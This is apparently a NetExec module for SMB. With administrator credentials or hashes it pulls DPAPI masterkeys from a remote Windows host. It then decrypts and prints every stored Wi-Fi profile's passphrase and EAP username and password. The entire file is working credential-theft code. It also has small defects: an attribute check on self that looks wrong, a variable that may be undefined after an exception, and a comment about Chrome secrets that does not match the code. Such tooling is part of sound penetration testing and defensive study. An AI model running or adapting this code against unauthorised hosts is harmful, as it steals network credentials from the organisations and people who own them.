from dploot.lib.target import Target
from dploot.triage.wifi import WifiTriage

from nxc.helpers.logger import highlight
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, upgrade_to_dploot_connection


class NXCModule:
    name = "wifi"
    description = "Get key of all wireless interfaces"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        username = connection.username
        password = getattr(connection, "password", "")
        nthash = getattr(connection, "nthash", "")

        target = Target.create(
            domain=connection.domain,
            username=username,
            password=password,
            target=connection.host if not connection.kerberos else connection.hostname + "." + connection.domain,
            lmhash=getattr(connection, "lmhash", ""),
            nthash=nthash,
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )

        conn = upgrade_to_dploot_connection(connection=connection.conn, target=target)
        if conn is None:
            context.log.debug("Could not upgrade connection")
            return

        masterkeys = collect_masterkeys_from_target(connection, target, conn, user=False)

        if len(masterkeys) == 0:
            context.log.fail("No masterkeys looted")
            return

        context.log.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting Wifi interfaces")

        try:
            # Collect Chrome Based Browser stored secrets
            wifi_triage = WifiTriage(target=target, conn=conn, masterkeys=masterkeys)
            wifi_creds = wifi_triage.triage_wifi()
        except Exception as e:
            context.log.debug(f"Error while looting wifi: {e}")
        for wifi_cred in wifi_creds:
            if wifi_cred.auth.upper() == "OPEN":
                context.log.highlight(f"[OPEN] {wifi_cred.ssid}")
            elif wifi_cred.auth.upper() in ["WPAPSK", "WPA2PSK", "WPA3SAE"]:
                try:
                    context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password.decode('latin-1')}")
                except Exception:
                    context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}")
            elif wifi_cred.auth.upper() in ["WPA", "WPA2"]:
                try:
                    if self.eap_username is not None and self.eap_password is not None:
                        context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type} - Identifier: {wifi_cred.eap_username}:{wifi_cred.eap_password}")
                    else:
                        context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - {wifi_cred.eap_type}")
                except Exception:
                    context.log.highlight(f"[{wifi_cred.auth.upper()}] {wifi_cred.ssid} - Passphrase: {wifi_cred.password}")
            else:
                context.log.highlight(f"[WPA-EAP] {wifi_cred.ssid} - {wifi_cred.eap_type}")
